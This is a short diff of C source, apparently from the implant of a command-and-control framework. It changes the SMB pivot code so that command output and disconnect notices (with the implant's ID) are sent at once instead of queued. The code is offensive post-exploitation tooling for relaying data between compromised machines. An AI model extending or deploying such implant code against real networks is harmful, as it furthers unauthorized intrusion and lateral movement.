@@ -271,7 +271,7 @@ VOID PivotPush()
                                 PackageAddInt32( Package, DEMON_PIVOT_SMB_COMMAND );
                                 PackageAddBytes( Package, Output, BytesSize );
 
-                                PackageQueue( Package );
+                                PackageTransmit( Package );
                             }
                             else PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
 
@@ -300,7 +300,7 @@ VOID PivotPush()
                         PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
                         PackageAddInt32( Package, Removed );
                         PackageAddInt32( Package, DemonID );
-                        PackageQueue( Package );
+                        PackageTransmit( Package );
 
                         break;
                     }
